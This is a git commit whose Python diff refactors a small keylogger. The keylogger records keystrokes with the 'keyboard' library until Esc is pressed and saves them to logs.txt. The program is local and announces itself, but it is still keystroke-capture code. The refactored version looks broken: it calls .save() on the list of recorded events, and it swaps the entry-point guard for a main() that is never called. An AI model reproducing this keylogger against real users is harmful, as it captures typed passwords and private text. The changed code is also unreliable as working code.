cba3f8aaa05792c633baa87d86dc83bc0d747dbf
Ariel Matias Melo <azaazay09@gmail.com>
2025-10-17 20:44:58 -0500

    Refactor keylogger function to simplify key recording and saving process

--- main.py
+++ main.py
@@ -4,14 +4,8 @@ def keylogger():
     print("Keylogger started. Press 'Esc' to stop.")
     keyboard.start_recording()
     keyboard.wait('esc')
-    recorded_keys = keyboard.stop_recording()
-    
-    with open("logs.txt", "w") as f:
-        for ejecucion in recorded_keys:
-            if ejecucion.event_type == keyboard.KEY_DOWN:
-                f.write(f"{ejecucion.name}\n")
-
+    keyboard.stop_recording().save("logs.txt")
     print("Keylogger stopped. Keys saved to logs.txt.")
 
-if __name__ == "__main__":
+def main():
     keylogger()
